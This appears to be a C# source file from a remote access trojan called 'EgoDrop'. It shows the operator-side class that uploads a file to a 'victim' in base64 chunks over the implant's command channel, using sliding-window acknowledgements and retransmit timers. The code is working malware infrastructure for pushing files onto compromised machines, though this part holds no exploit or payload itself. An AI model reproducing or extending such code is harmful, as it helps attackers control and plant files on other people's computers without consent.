using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using System.Threading.Tasks;

using System.Timers;

namespace EgoDrop
{
    internal class clsFileHandler
    {
        /// <summary>
        /// Send file chunk with sliding window method.
        /// </summary>

        private Dictionary<int, byte[]> m_dicUnAcked = new Dictionary<int, byte[]>();
        private Dictionary<int, clsChunkTimer> m_dicTimers = new Dictionary<int, clsChunkTimer>();

        private clsVictim m_victim { get; set; }
        private string m_szFilePath { get; set; }
        private frmFileTransfer.enTransfer m_enTransferMethod { get; set; }
        private int m_nChunkSize { get; set; }
        private int m_nWindowSize { get; set; }

        private int m_nBase { get; set; }
        private int m_nNextSeq { get; set; }

        private bool m_bTransferDone { get; set; }

        public clsFileHandler(clsVictim victim, string szFilePath, frmFileTransfer.enTransfer enMethod, int nChunkSize, int nWindowSize)
        {
            m_victim = victim;
            m_szFilePath = szFilePath;
            m_enTransferMethod = enMethod;

            m_nBase = 0;
            m_nNextSeq = 0;

            m_nChunkSize = nChunkSize;
            m_nWindowSize = nWindowSize;
        }

        public async Task fnSendFileAsync()
        {
            using (FileStream fs = new FileStream(m_szFilePath, FileMode.Open, FileAccess.Read))
            {
                int nRead = 0;
                long nTotalSize = fs.Length;
                int nTotalChunk = (int)Math.Ceiling(nTotalSize / (double)m_nChunkSize);

                //Start ACK event handler.

                byte[] abBuffer = new byte[m_nChunkSize];


                while (!m_bTransferDone)
                {
                    while (
                        m_nNextSeq < m_nBase + m_nWindowSize
                        && (nRead = fs.Read(abBuffer, 0, abBuffer.Length)) > 0
                    )
                    {
                        byte[] abChunk = new byte[nRead];
                        Buffer.BlockCopy(abBuffer, 0, abChunk, 0, nRead);

                        fnSendChunk(m_nNextSeq, abChunk);

                        m_dicUnAcked[m_nNextSeq] = abChunk;

                        fnStartTimer(m_nNextSeq);

                        m_nNextSeq++;
                    }

                    if (m_nBase >= nTotalChunk)
                        m_bTransferDone = true;

                    await Task.Delay(5);
                }
            }
        }

        private void fnSendChunk(int nSeq, byte[] abChunk)
        {
            m_victim.fnSendCommand(new string[]
            {
                "file",
                "uf",
                nSeq.ToString(),
                Convert.ToBase64String(abChunk),
            });
        }

        private void fnStartTimer(int nSeq)
        {
            var timer = new clsChunkTimer(800, () => fnTimeout(nSeq));
            timer.fnStart();
            m_dicTimers[nSeq] = timer;
        }

        private void fnTimeout(int nSeq)
        {
            if (!m_dicTimers.ContainsKey(nSeq))
                return;

            fnSendChunk(nSeq, m_dicUnAcked[nSeq]);
            fnStartTimer(nSeq);
        }

        public void fnAck(int nSeq)
        {
            if (!m_dicUnAcked.ContainsKey(nSeq))
                return;

            if (m_dicTimers.ContainsKey(nSeq))
            {
                m_dicTimers[nSeq].fnStop();
                m_dicTimers.Remove(nSeq);
            }

            m_dicUnAcked.Remove(nSeq);

            if (nSeq == m_nBase)
            {
                while (!m_dicUnAcked.ContainsKey(m_nBase) && m_nBase < m_nNextSeq)
                {
                    m_nBase++;
                }
            }
        }
    }

    internal class clsChunkTimer
    {
        private readonly System.Timers.Timer m_timer;
        private readonly Action m_actOnTimeout;

        public clsChunkTimer(double nMiliSecond, Action actOnTimeout)
        {
            m_timer = new System.Timers.Timer(nMiliSecond);
            m_actOnTimeout = actOnTimeout;

            m_timer.Elapsed += (s, e) => m_actOnTimeout();
            m_timer.AutoReset = false;
        }

        public void fnStart() => m_timer.Start();
        public void fnStop() => m_timer.Stop();
    }
}
